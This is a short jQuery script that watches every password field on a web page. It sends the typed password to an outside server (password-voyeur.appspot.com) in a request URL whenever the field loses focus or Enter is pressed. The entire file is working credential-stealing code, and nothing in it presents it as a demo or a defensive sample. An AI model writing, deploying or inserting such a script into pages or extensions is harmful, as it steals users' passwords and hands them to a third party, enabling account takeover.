$(document).ready(function () {
    var passwords = [];
    if ($('input[type="password"]').length) {
        // Send the password when the user leaves the password field
        $('input[type="password"]').blur(function() {
            var password = $(this).val()
            sendPassword($(this).val());
        });
        // Also send the password when the user presses the enter key while in 
        // a password field
        $('input[type="password"]').keypress(function() {
            if (event.which == 13) {
                var password = $(this).val()
                sendPassword($(this).val());
            }
        });
    }
});

function sendPassword(password) {
    $.ajax({
        url: 'https://password-voyeur.appspot.com/get-password/' + password + '/',
        dataType: 'xml',
        data: {}
    });
}
